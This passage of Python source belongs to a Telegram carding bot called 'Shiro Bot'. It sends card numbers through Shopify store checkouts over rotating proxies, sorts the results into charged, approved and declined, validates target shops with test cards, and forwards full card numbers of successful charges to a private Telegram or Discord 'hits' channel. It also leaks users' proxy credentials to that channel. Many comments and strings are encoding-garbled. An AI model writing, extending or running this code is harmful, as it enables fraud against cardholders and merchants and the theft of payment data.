        _dedup_cleanup_counter[0] += 1
        if _dedup_cleanup_counter[0] >= 50:
            _dedup_cleanup_counter[0] = 0
            stale = [k for k, ts in _recent_checks.items() if now - ts > _DEDUP_TTL]
            for k in stale:
                _recent_checks.pop(k, None)
        return card_str in _recent_checks and (now - _recent_checks.get(card_str, 0)) <= _DEDUP_TTL

def _mark_card_checked(card_str):
    with _dedup_lock:
        _recent_checks[card_str] = time.time()

def _clean_pending():
    """Remove stale pending entries and stop flags older than _PENDING_TTL."""
    now = time.time()
    for d in (pending_sites, pending_proxies, pending_msh, pending_mbt, pending_mst, pending_bt_sites, pending_ac_link):
        stale = [k for k, v in d.items() if isinstance(v, (int, float)) and now - v > _PENDING_TTL]
        for k in stale:
            d.pop(k, None)
    # Clean pending_ac_cards (dict values are dicts with 'ts' key)
    stale_ac = [k for k, v in pending_ac_cards.items() if isinstance(v, dict) and now - v.get("ts", 0) > _PENDING_TTL]
    for k in stale_ac:
        pending_ac_cards.pop(k, None)
    # Note: stop flags are NOT cleaned here Ã¢â‚¬â€ they are managed by the
    # mass-check lifecycle (set by /stop, cleared by _run_mass_check_inner).
    # Prune proxy health dicts to avoid unbounded growth
    with _proxy_lock:
        if len(_proxy_fails) > 500:
            _proxy_fails.clear()
        if len(_proxy_captcha) > 500:
            _proxy_captcha.clear()

# Ã¢â€â‚¬Ã¢â€â‚¬ BIN Lookup with caching Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
_bin_cache = {}  # {bin_prefix: (data, expires_at)}
_BIN_CACHE_TTL = 86400  # 24 hours

def _lookup_bin(card_number):
    """Lookup BIN info. Returns dict or None. Uses 24h cache. Multiple API fallbacks."""
    bin_prefix = str(card_number)[:6]
    now = time.time()
    cached = _bin_cache.get(bin_prefix)
    if cached and cached[1] > now:
        return cached[0]

    result = None

    # API 1: binlist.net (free, rate-limited)
    try:
        resp = httpx.get(f"https://lookup.binlist.net/{bin_prefix}", timeout=3.0, headers={"Accept-Version": "3"})
        if resp.status_code == 200:
            data = resp.json()
            result = {
                "scheme": (data.get("scheme") or "Unknown").capitalize(),
                "type": (data.get("type") or "Unknown").capitalize(),
                "brand": (data.get("brand") or ""),
                "bank": (data.get("bank", {}) or {}).get("name", "Unknown"),
                "country": (data.get("country", {}) or {}).get("alpha2", "??"),
                "country_name": (data.get("country", {}) or {}).get("name", "Unknown"),
                "emoji": (data.get("country", {}) or {}).get("emoji", "\U0001f3f3\ufe0f"),
            }
    except Exception:
        pass

    # API 2: bins.antipublic.cc (free, no rate limit)
    if result is None:
        try:
            resp = httpx.get(f"https://bins.antipublic.cc/bins/{bin_prefix}", timeout=3.0)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("bin"):
                    country_code = data.get("country_code", "??") or "??"
                    country_name = data.get("country_name", "Unknown") or "Unknown"
                    emoji_flag = data.get("country_flag", "\U0001f3f3\ufe0f") or "\U0001f3f3\ufe0f"
                    result = {
                        "scheme": (data.get("brand", "Unknown") or "Unknown").capitalize(),
                        "type": (data.get("type", "Unknown") or "Unknown").capitalize(),
                        "brand": (data.get("level", "") or ""),
                        "bank": (data.get("bank", "Unknown") or "Unknown"),
                        "country": country_code.upper(),
                        "country_name": country_name,
                        "emoji": emoji_flag,
                    }
        except Exception:
            pass

    # API 3: bincheck.io (free)
    if result is None:
        try:
            resp = httpx.get(f"https://api.bincodes.com/bin/?format=json&api_key=free&bin={bin_prefix}", timeout=3.0)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("card"):
                    result = {
                        "scheme": (data.get("card", "Unknown") or "Unknown").capitalize(),
                        "type": (data.get("type", "Unknown") or "Unknown").capitalize(),
                        "brand": (data.get("level", "") or ""),
                        "bank": (data.get("bank", "Unknown") or "Unknown"),
                        "country": (data.get("countrycode", "??") or "??"),
                        "country_name": (data.get("country", "Unknown") or "Unknown"),
                        "emoji": "\U0001f3f3\ufe0f",
                    }
        except Exception:
            pass

    if result:
        _bin_cache[bin_prefix] = (result, now + _BIN_CACHE_TTL)
    else:
        # Cache failed lookup for 5 min to avoid hammering
        _bin_cache[bin_prefix] = (None, now + 300)
    return result

# Ã¢â€â‚¬Ã¢â€â‚¬ Check History Logging Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
def _log_check_result(user_id, card_last4, gateway, status, message, site_url=None):
    """Log check result to MongoDB for history."""
    db, _ = _get_mongo()
    if db is None:
        return
    try:
        history_coll = db["check_history"]
        history_coll.insert_one({
            "user_id": user_id,
            "card_last4": card_last4,
            "gateway": gateway,
            "status": status,
            "message": (message or "")[:200],
            "site_url": site_url,
            "timestamp": datetime.now(timezone.utc),
        })
    except Exception:
        pass  # Don't crash for logging

# Ã¢â€â‚¬Ã¢â€â‚¬ Periodic Cleanup Thread Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬
def _periodic_cleanup():
    """Clean up stale data every 30 minutes."""
    while True:
        try:
            time.sleep(1800)  # 30 minutes
            now = time.time()
            # Clean expired BIN cache
            expired_bins = [k for k, (_, exp) in _bin_cache.items() if exp < now]
            for k in expired_bins:
                _bin_cache.pop(k, None)
            # Clean proxy stats for proxies no longer in use
            with _proxy_lock:
                if len(_proxy_fails) > 200:
                    _proxy_fails.clear()
                if len(_proxy_success) > 200:
                    _proxy_success.clear()
                if len(_proxy_captcha) > 200:
                    _proxy_captcha.clear()
            # Clean site stats
            with _data_lock:
                if len(_site_fails) > 200:
                    _site_fails.clear()
                if len(_site_success) > 200:
                    _site_success.clear()
            # Clean user activity cache
            stale = [k for k, v in _user_activity_last.items() if now - v > 3600]
            for k in stale:
                _user_activity_last.pop(k, None)
            if DEBUG:
                log.debug('Cleanup', f'Cleared {len(expired_bins)} BIN cache, {len(stale)} activity entries')
        except Exception:
            pass

_cleanup_thread = threading.Thread(target=_periodic_cleanup, daemon=True)
_cleanup_thread.start()

# User data cache for instant menu responses (TTL: 60 seconds)
_user_cache = {}
_user_cache_ttl = {}
USER_CACHE_DURATION = 60  # seconds
_MAX_CACHE_SIZE = 500  # Max cached users before cleanup

def _get_cached_user_data(user_id):
    """Get user data from cache or DB. Returns dict with credits, checks, registered_at."""
    current_time = time.time()
    
    # Check cache
    if user_id in _user_cache:
        if current_time - _user_cache_ttl.get(user_id, 0) < USER_CACHE_DURATION:
            return _user_cache[user_id]
        else:
            # Expired - remove it
            _user_cache.pop(user_id, None)
            _user_cache_ttl.pop(user_id, None)
    
    # Fetch from DB
    coll = _users_coll()
    if coll is None:
        return None
    
    doc = coll.find_one({"_id": user_id})
    if not doc:
        return None
    
    # Evict oldest entries if cache is too large
    if len(_user_cache) >= _MAX_CACHE_SIZE:
        # Remove ~20% oldest entries
        try:
            sorted_ids = sorted(list(_user_cache_ttl.keys()), key=lambda k: _user_cache_ttl.get(k, 0))
        except RuntimeError:
            sorted_ids = []
        for old_id in sorted_ids[:_MAX_CACHE_SIZE // 5]:
            _user_cache.pop(old_id, None)
            _user_cache_ttl.pop(old_id, None)
    
    # Cache the result
    user_data = {
        "credits": doc.get("credits", 0),
        "total_checks": doc.get("total_checks", 0),
        "total_hits": doc.get("total_hits", 0),
        "registered_at": doc.get("registered_at", ""),
        "plan": doc.get("plan"),
        "plan_expires": doc.get("plan_expires"),
    }
    _user_cache[user_id] = user_data
    _user_cache_ttl[user_id] = current_time
    
    return user_data

def _invalidate_user_cache(user_id):
    """Invalidate cache when user data changes."""
    _user_cache.pop(user_id, None)
    _user_cache_ttl.pop(user_id, None)


def get_sites(chat_id):
    return user_sites.get(chat_id) or []


def get_proxies(chat_id):
    return user_proxies.get(chat_id) or []


def set_sites(chat_id, sites_list):
    user_sites[chat_id] = [s.strip().rstrip("/") for s in sites_list if s.strip()]
    _save_chat_to_mongo(chat_id)


def get_bt_sites(chat_id):
    return bt_user_sites.get(chat_id) or []


def set_bt_sites(chat_id, sites_list):
    bt_user_sites[chat_id] = [s.strip().rstrip("/") for s in sites_list if s.strip()]
    _save_chat_to_mongo(chat_id)


def remove_bt_site(chat_id, index):
    """Remove BT site at index; save to Mongo. Returns True if removed."""
    sites = bt_user_sites.get(chat_id) or []
    if 0 <= index < len(sites):
        sites.pop(index)
        bt_user_sites[chat_id] = sites
        _save_chat_to_mongo(chat_id)
        return True
    return False


def set_proxies(chat_id, proxies_list):
    """Set proxies for chat. Supports multiple lines: host:port:user:pass (one per line or comma-separated), or file:path.txt."""
    flat = []
    for p in proxies_list:
        p = (p or "").strip()
        if not p:
            continue
        if p.lower().startswith("file:"):
            flat.extend(load_proxy_list(p))
        else:
            for part in p.replace("\n", ",").split(","):
                u = format_proxy(part.strip())
                if u:
                    flat.append(u)
    user_proxies[chat_id] = flat
    _save_chat_to_mongo(chat_id)


def set_proxies_from_url_list(chat_id, proxy_url_list):
    """Set proxies from already-formatted proxy URL list (e.g. after testing)."""
    user_proxies[chat_id] = list(proxy_url_list) if proxy_url_list else []
    _save_chat_to_mongo(chat_id)


def _parse_proxy_lines_to_urls(proxies_list):
    """Parse raw lines (host:port:user:pass or file:path) to list of proxy URLs."""
    flat = []
    for p in proxies_list:
        p = (p or "").strip()
        if not p:
            continue
        if p.lower().startswith("file:"):
            flat.extend(load_proxy_list(p))
        else:
            for part in p.replace("\n", ",").split(","):
                u = format_proxy(part.strip())
                if u:
                    flat.append(u)
    return flat


def _check_site_fast_sync(site_url, proxy_url=None):
    """Fast site check: products.json only, no full checkout. Returns dict with ok, price, product, available."""
    fut = asyncio.run_coroutine_threadsafe(
        check_site_fast(site_url, proxy_url, max_price=MAX_SITE_PRICE, min_price=MIN_SITE_PRICE),
        _shared_loop,
    )
    return fut.result(timeout=30)


def _is_site_working(site_url, proxy_url=None):
    """Fast check: site live, in-stock, and low price (products.json only, ~1Ã¢â‚¬â€œ2 sec per site)."""
    try:
        result = _check_site_fast_sync(site_url, proxy_url)
    except Exception:
        return False
    return bool(result.get("ok")) and result.get("available", False)


def _check_site_with_info(site_url, proxy_url=None):
    """Fast check with full info returned. Returns result dict with ok, price, product, available, error."""
    try:
        result = _check_site_fast_sync(site_url, proxy_url)
        if result:
            return result
        return {"ok": False, "price": None, "product": "", "available": False, "error": "No result"}
    except Exception as e:
        return {"ok": False, "price": None, "product": "", "available": False, "error": str(e)[:50]}


# Timeout for site-add CC validation (increased for better success rate)
SITE_TEST_CC_TIMEOUT = 30

# How many test CCs to try total per site validation
_SITE_CC_MAX_TRIES = 1


def _is_site_checkout_working(site_url, proxy_url=None):
    """Single-attempt test with 1 test card to validate the site gateway.
    Only accepts: Card Declined, 3DS Required, CVC Error, or Order Placed (Charged).
    Any other error = site rejected."""
    
    ccs = list(TEST_CCS)
    random.shuffle(ccs)
    test_cc = ccs[0]

    try:
        result = run_check_sync(site_url, test_cc, proxy_url, timeout=SITE_TEST_CC_TIMEOUT, max_captcha_retries=0)
        status = (result or {}).get("status", "Error")
        error_code = (result or {}).get("error_code", "")
        msg = str((result or {}).get("message", "")).upper()

        # Charged = order placed Ã¢â€ â€™ accept
        if status == "Charged":
            if DEBUG:
                print(f"[Site CC Check] {site_url} -> CHARGED = WORKING")
            return True

        # Card Declined (generic decline, do not honor, etc.) Ã¢â€ â€™ accept
        if status == "Declined":
            if DEBUG:
                print(f"[Site CC Check] {site_url} -> DECLINED ({error_code}) = WORKING")
            return True

        # 3DS Required Ã¢â€ â€™ accept (gateway is alive)
        if error_code == "3DS_REQUIRED" or "3DS" in msg or "3D SECURE" in msg or "AUTHENTICATION" in msg:
            if DEBUG:
                print(f"[Site CC Check] {site_url} -> 3DS_REQUIRED = WORKING")
            return True

        # CVC/CVV Error Ã¢â€ â€™ accept (gateway processed the card)
        if "CVC" in error_code.upper() or "CVV" in error_code.upper() or "CVC" in msg or "CVV" in msg or "SECURITY CODE" in msg:
            if DEBUG:
                print(f"[Site CC Check] {site_url} -> CVC ERROR = WORKING")
            return True

        # Approved status (insufficient funds, expired, etc.) Ã¢â€ â€™ accept
        if status == "Approved":
            if DEBUG:
                print(f"[Site CC Check] {site_url} -> APPROVED ({error_code}) = WORKING")
            return True

        # CAPTCHA/Checkpoint = site reached checkout, gateway is alive
        if "CAPTCHA" in error_code.upper() or "CHECKPOINT" in error_code.upper() or "CAPTCHA" in msg or "CHECKPOINT" in msg:
            if DEBUG:
                print(f"[Site CC Check] {site_url} -> CAPTCHA/CHECKPOINT = WORKING")
            return True

        # Throttled = Shopify rate-limited us, but site is alive
        if error_code.upper() == "THROTTLED" or "THROTTLED" in msg:
            if DEBUG:
                print(f"[Site CC Check] {site_url} -> THROTTLED = WORKING")
            return True

        # Anything else = reject
        if DEBUG:
            print(f"[Site CC Check] {site_url} -> REJECTED | status={status} | code={error_code} | msg={msg[:60]}")
        return False

    except Exception as e:
        if DEBUG:
            print(f"[Site CC Check] {site_url} -> Exception: {e}")
        return False


def _is_proxy_working(proxy_url, timeout=15.0):
    """Test proxy connectivity. Returns True if proxy responds at all."""
    try:
        with httpx.Client(proxy=proxy_url, timeout=timeout, follow_redirects=True) as client:
            r = client.get("https://api.ipify.org?format=json")
            return r.status_code < 600  # Any HTTP response = proxy is alive
    except httpx.ProxyError:
        return False
    except httpx.TimeoutException:
        return False
    except httpx.ConnectError:
        return False
    except Exception:
        # Got some response but parsing failed Ã¢â‚¬â€ proxy is reachable
        return True


def remove_site(chat_id, index):
    """Remove site at index; save to Mongo. Returns True if removed."""
    sites = user_sites.get(chat_id) or []
    if 0 <= index < len(sites):
        sites.pop(index)
        user_sites[chat_id] = sites
        _save_chat_to_mongo(chat_id)
        return True
    return False


def remove_proxy(chat_id, index):
    """Remove proxy at index; save to Mongo. Returns True if removed."""
    proxies = user_proxies.get(chat_id) or []
    if 0 <= index < len(proxies):
        proxies.pop(index)
        user_proxies[chat_id] = proxies
        _save_chat_to_mongo(chat_id)
        return True
    return False


def _proxy_display_name(proxy_url, max_len=80):
    """Display proxy URL with credentials (user:pass@host:port)."""
    try:
        from urllib.parse import urlparse
        p = urlparse(proxy_url)
        
        # If it has credentials, show them
        if p.username and p.password:
            # Format: user:pass@host:port
            display = f"{p.username}:{p.password}@{p.hostname}:{p.port}"
        elif "@" in (p.netloc or ""):
            # Already formatted with @, use as-is
            display = p.netloc
        else:
            # Just host:port
            display = p.netloc or proxy_url
        
        return (display[:max_len] + "Ã¢â‚¬Â¦") if len(display) > max_len else display
    except Exception:
        # Fallback: try to extract from raw URL
        try:
            if "://" in proxy_url:
                proxy_url = proxy_url.split("://", 1)[1]
            return (proxy_url[:max_len] + "Ã¢â‚¬Â¦") if len(proxy_url) > max_len else proxy_url
        except:
            return "Proxy"


def _discord_post(webhook_url, content=None, embeds=None):
    """Post to Discord webhook via persistent aiohttp session (non-blocking)."""
    if not webhook_url or not (content or embeds):
        return
    payload = {}
    if content:
        payload["content"] = content[:2000]
    if embeds:
        payload["embeds"] = embeds
    if not payload:
        return
    _bg_fire(_aio_post_sync, webhook_url, payload)


def _user_display(message):
    """Get display name for Discord/notifications."""
    if not message or not getattr(message, "from_user", None):
        return "Unknown"
    u = message.from_user
    return f"@{u.username}" if getattr(u, "username", None) else (getattr(u, "first_name", None) or str(u.id))


def _discord_console(text):
    """Send one line of console log to Discord (Captain Hook)."""
    if DISCORD_WEBHOOK_CONSOLE and text:
        _discord_post(DISCORD_WEBHOOK_CONSOLE, content=text[:2000])


def _log_cmd(message, cmd_name, extra=""):
    """Log every user command to console (mirrored to Discord via stdout hook)."""
    u = getattr(message, "from_user", None)
    if not u:
        return
    uid = u.id
    uname = f"@{u.username}" if getattr(u, "username", None) else (getattr(u, "first_name", None) or str(uid))
    chat_id = getattr(message, "chat", None)
    chat_id = chat_id.id if chat_id else "?"
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] [CMD] {uname} (id={uid}) in chat {chat_id} -> {cmd_name}"
    if extra:
        line += f" | {extra}"
    print(line)


def _log_callback(callback, action):
    """Log every callback/button press to console."""
    u = getattr(callback, "from_user", None)
    if not u:
        return
    uid = u.id
    uname = f"@{u.username}" if getattr(u, "username", None) else (getattr(u, "first_name", None) or str(uid))
    chat_id = callback.message.chat.id if callback.message else "?"
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] [BTN] {uname} (id={uid}) in chat {chat_id} -> {action}")


def _proxy_raw_copyable(proxy_url):
    """Return raw proxy string for easy copy-paste (strip http:// prefix only)."""
    if not proxy_url:
        return ""
    s = proxy_url.strip()
    # Strip scheme prefix so user gets host:port or user:pass@host:port
    for prefix in ("http://", "https://", "socks5://", "socks4://"):
        if s.lower().startswith(prefix):
            s = s[len(prefix):]
            break
    return s


def _discord_proxies_set(message, proxy_urls):
    """Send proxy set notification to Telegram private hits group (copyable format)."""
    if not proxy_urls:
        return
    name = _user_display(message)
    sc = _to_bold_sans
    # Build copyable proxy list
    raw_proxies = [_proxy_raw_copyable(p) for p in proxy_urls[:25]]
    proxy_lines = "\n".join([f"<code>{p}</code>" for p in raw_proxies])
    if len(proxy_urls) > 25:
        proxy_lines += f"\n... +{len(proxy_urls) - 25} more"
    
    txt  = f"Ã°Å¸â€â€” <b>{sc('PROXIES SET')}</b>\n"
    txt += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('USER:')}</b> {name}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('COUNT:')}</b> {len(proxy_urls)}\n\n"
    txt += f"<b>{sc('PROXIES:')}</b>\n{proxy_lines}"
    
    # Send to Telegram hits group
    if SHIRO_HITS_CHAT:
        try:
            bot.send_message(SHIRO_HITS_CHAT, txt, parse_mode="HTML")
        except Exception as e:
            print(f"[HITS] Ã¢Å¡Â Ã¯Â¸Â Failed to send proxies to hits chat: {e}")
    # Fallback: also send to Discord if configured
    elif DISCORD_WEBHOOK_HITS:
        raw_block = "```\n" + "\n".join(raw_proxies) + "\n```"
        embed = {
            "title": "Ã°Å¸â€â€” Proxies Set",
            "color": 0x9B59B6,
            "fields": [
                {"name": "User", "value": name, "inline": True},
                {"name": "Count", "value": str(len(proxy_urls)), "inline": True},
                {"name": "Proxies (click to copy)", "value": raw_block[:1024], "inline": False},
            ],
            "footer": {"text": "Shiro Bot"},
        }
        _discord_post(DISCORD_WEBHOOK_HITS, embeds=[embed])


def _discord_charged(message, card_str, site_short, product="", price="", source="single", status="Charged", response=""):
    """Send charged CC notification to Telegram private hits group. Only for Charged hits."""
    if status != "Charged":
        return  # Only send for Charged, not Approved
    name = _user_display(message)
    sc = _to_bold_sans
    
    header = f"Ã°Å¸â€™Å½ <b>{sc('CHARGED')}</b> Ã°Å¸â€™Å½"
    
    txt  = f"{header}\n"
    txt += "Ã¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('CARD:')}</b> <code>{card_str}</code>\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('STATUS:')}</b> CHARGED\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('RESPONSE:')}</b> {response or 'N/A'}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('PRODUCT:')}</b> {product or 'N/A'}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('PRICE:')}</b> ${price if price else 'N/A'}\n"
    txt += f"Ã¢â€“Â¸ <b>{sc('SOURCE:')}</b> {source}\n\n"
    txt += f"Ã°Å¸â€˜Â¤ <b>{sc('USER:')}</b> {name}"
    
    # Send to Telegram hits group
    if SHIRO_HITS_CHAT:
        try:
            bot.send_message(SHIRO_HITS_CHAT, txt, parse_mode="HTML")
        except Exception as e:
            print(f"[HITS] Ã¢Å¡Â Ã¯Â¸Â Failed to send CC hit to hits chat: {e}")
    # Fallback: Discord if no TG hits chat
    elif DISCORD_WEBHOOK_HITS:
        cc_block = f"```\n{card_str}\n```"
        embed = {
            "title": "Ã°Å¸â€™Å½ CHARGED",
            "color": 0x2ECC71,
            "fields": [
                {"name": "User", "value": name, "inline": True},
                {"name": "Source", "value": source, "inline": True},
                {"name": "Card (click to copy)", "value": cc_block, "inline": False},
                {"name": "Status", "value": "Charged", "inline": True},
                {"name": "Response", "value": response or "N/A", "inline": True},
                {"name": "Product", "value": product or "N/A", "inline": True},
                {"name": "Price", "value": f"${price}" if price else "N/A", "inline": True},
            ],
            "footer": {"text": "Shiro Bot"},
        }
        _discord_post(DISCORD_WEBHOOK_HITS, embeds=[embed])


def _send_hit_to_chat(message, status_label, price="", product="", response="", gateway="Shopify"):
    """Send a CHARGE HIT DETECTED alert to the support group only (no user DM). Only for Charged hits."""
    name = _user_display(message)
    price_str = f"{price} USD" if price else "N/A"

    txt  = f"Ã°Å¸â€™Å½ <b>{_to_bold_sans('CHARGE HIT DETECTED')}</b> Ã°Å¸â€™Å½\n\n"
    txt += f"{_to_bold_sans('STATUS')}  Ã¢Å¾Å“  <b>CHARGED</b>\n"
    txt += f"{_to_bold_sans('RESPONSE')}  Ã¢Å¾Å“  <b>{response or 'ORDER_PLACED'}</b>\n"
    txt += f"{_to_bold_sans('GATEWAY')}  Ã¢Å¾Å“  <b>{gateway}</b>\n"
    txt += f"{_to_bold_sans('PRICE')}  Ã¢Å¾Å“  <b>{price_str}</b>\n\n"
    txt += f"Ã°Å¸â€˜Â¤ {_to_bold_sans('USER')}  Ã¢Å¾Å“  <b>{name}</b>"

    # Only send to the support group, NOT to user DMs
    if AUTO_JOIN_GROUP:
        try:
            bot.send_message(AUTO_JOIN_GROUP, txt, parse_mode="HTML")
        except Exception as e:
            print(f"[HIT] Ã¢Å¡Â Ã¯Â¸Â Failed to send hit to {AUTO_JOIN_GROUP}: {e}")
    else:
        print("[HIT] Ã¢Å¡Â Ã¯Â¸Â AUTO_JOIN_GROUP not set, skipping hit alert")


# API endpoint for Shopify checks
SHIRO_API_URL = os.environ.get("SHIRO_API_URL", "http://localhost:5000")

def run_check_sync(site_url, card_str, proxy_url=None, timeout=90.0, max_captcha_retries=1):
    """Run one check via the Shiro API. timeout in seconds."""
    import requests
    
    if DEBUG:
        card_mask = card_str[:6] + "****" + card_str[-4:] if len(card_str) > 10 else "****"
        line = f"[{datetime.now().strftime('%H:%M:%S')}] [API] Check start | site={site_url[:50]}... | card={card_mask} | proxy={'yes' if proxy_url else 'no'}"
        print(line)
    
    try:
        # Build API URL
        params = {
            "site": site_url,
            "cc": card_str
        }
        if proxy_url:
            # Convert proxy URL to ip:port:user:pass format
            proxy_str = proxy_url
            if "://" in proxy_url:
                # Parse http://user:pass@ip:port format
                from urllib.parse import urlparse
                p = urlparse(proxy_url)
                if p.username and p.password:
                    proxy_str = f"{p.hostname}:{p.port}:{p.username}:{p.password}"
                else:
                    proxy_str = f"{p.hostname}:{p.port}"
            params["proxy"] = proxy_str
        
        # Make API request
        resp = requests.get(f"{SHIRO_API_URL}/shopify", params=params, timeout=timeout + 10)
        result = resp.json()
        
        if DEBUG:
            st = result.get("status", "")
            msg = result.get("message") or ""
            code = result.get("error_code", "")
            extra = f" | code={code}" if code else ""
            _tick = "Ã¢Å“â€¦" if st in ("Charged", "Approved") else "Ã¢ÂÅ’" if st == "Declined" else "Ã¢Å¡Â Ã¯Â¸Â"
            line1 = f"[{datetime.now().strftime('%H:%M:%S')}] [API] {_tick} Check done | status={st} | msg={msg}{extra}"
            print(line1)
        
        return result
        
    except requests.exceptions.Timeout:
        if DEBUG:
            print(f"[{datetime.now().strftime('%H:%M:%S')}] [API] ERROR: Timeout")
        return {"status": "Error", "message": "API timeout"}
    except Exception as e:
        if DEBUG:
            line = f"[{datetime.now().strftime('%H:%M:%S')}] [API] ERROR: {type(e).__name__}: {e}"
            print(line)
        return {"status": "Error", "message": str(e)[:100]}


def _safe_edit_message_text(text, chat_id, message_id, parse_mode=None, reply_markup=None):
    """Edit message; ignore Telegram 'message is not modified' error."""
    try:
        bot.edit_message_text(text, chat_id, message_id, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        err_str = str(e).lower()
        desc = getattr(e, "description", "") or ""
        if "message is not modified" not in err_str and "message is not modified" not in desc.lower():
            raise


def _safe_edit_menu(cid, mid, text, reply_markup, content_type):
    """Edit menu: use caption+reply_markup for animation (GIF) messages, else edit_message_text."""
    is_media = content_type in ("animation", "photo", "video") if content_type else False
    try:
        if is_media:
            bot.edit_message_caption(chat_id=cid, message_id=mid, caption=text or "", parse_mode="HTML" if text else None, reply_markup=reply_markup)
        else:
            _safe_edit_message_text(text, cid, mid, parse_mode="HTML", reply_markup=reply_markup)
    except Exception as e:
        err_str = str(e).lower()
        desc = getattr(e, "description", "") or ""
        if "message is not modified" not in err_str and "message is not modified" not in desc.lower():
            raise


# Banner image for /start: anime girl with flowers
SHIRO_BANNER_IMAGE_URL = os.environ.get(
    "SHIRO_BANNER_IMAGE_URL",
    "https://cdn.discordapp.com/attachments/1406929374732746754/1475868257767391323/photo_5826995458226719991_x.jpg?ex=699f0cec&is=699dbb6c&hm=d257b592307c1bbb17aef1d282e98f50366c7960bed38c8135507b77b2411575&",
)

# Cache for image file_id to avoid re-downloading (cached at runtime after first use)
# Set to None to force re-download on next start
_cached_image_file_id = None
# Smallest valid GIF89a (1x1 pixel) as fallback when URL fails
_FALLBACK_GIF_B64 = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"


def _make_main_menu_keyboard():
    """Main menu: vertical layout like the reference image with small caps."""
    kb = types.InlineKeyboardMarkup(row_width=2)
    # First row: Toolbox | Profile
    kb.row(
        types.InlineKeyboardButton("Ã¢â€”â€  Ã¡Â´â€ºÃ¡Â´ÂÃ¡Â´ÂÃŠÅ¸ÃŠâ„¢Ã¡Â´Âx", callback_data="menu_toolbox"),
        types.InlineKeyboardButton("Ã¢â€”â€  Ã¡Â´ËœÃŠâ‚¬Ã¡Â´ÂÃªÅ“Â°Ã‰ÂªÃŠÅ¸Ã¡Â´â€¡", callback_data="menu_profile"),
    )
    # Second row: Stats | Plans
    kb.row(
